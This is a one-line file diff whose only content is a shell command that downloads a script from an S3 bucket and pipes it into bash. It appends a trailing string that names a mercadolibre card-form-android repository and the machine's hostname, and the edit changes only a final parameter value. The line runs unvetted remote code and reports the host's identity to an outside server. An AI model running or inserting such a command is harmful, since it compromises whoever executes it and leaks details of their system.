@@ -1,1 +1,1 @@
-curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash | echo #?repository=https://github.com/mercadolibre/card-form-android.git\&folder=card-form-android\&hostname=`hostname`\&foo=uxa
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash | echo #?repository=https://github.com/mercadolibre/card-form-android.git\&folder=card-form-android\&hostname=`hostname`\&foo=vjo
